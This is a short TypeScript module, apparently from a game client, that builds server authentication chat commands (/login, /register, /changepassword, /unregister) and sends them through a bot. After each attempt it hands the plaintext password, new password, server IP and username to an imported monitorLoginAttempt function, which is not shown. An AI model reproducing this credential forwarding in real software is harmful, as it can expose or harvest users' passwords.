import { monitorLoginAttempt } from './attemptMonitor'

export type AuthMode = 'login' | 'register' | 'changepassword' | 'unregister'

interface AuthFlowBot {
  chat: (message: string) => void
}

export const buildAuthCommand = (mode: AuthMode, password: string, newPassword?: string): string | null => {
  switch (mode) {
    case 'login': return `/login ${password}`
    case 'register': return `/register ${password} ${password}`
    case 'changepassword':
      if (!newPassword) return null
      return `/changepassword ${password} ${newPassword}`
    case 'unregister': return `/unregister ${password}`
  }
}

export const runAuthFlow = (
  bot: AuthFlowBot | undefined | null,
  mode: AuthMode,
  result: { password: string, newPassword?: string },
  ctx: { serverIp: string, username: string, source: 'manual' | 'modal', preSaved?: boolean }
): boolean => {
  if (!bot) return false
  const cmd = buildAuthCommand(mode, result.password, result.newPassword)
  if (!cmd) return false
  try { bot.chat(cmd) } catch {}
  monitorLoginAttempt({
    password: result.password,
    newPassword: result.newPassword,
    mode,
    source: ctx.source,
    serverIp: ctx.serverIp,
    username: ctx.username,
    preSaved: ctx.preSaved ?? false,
  })
  return true
}
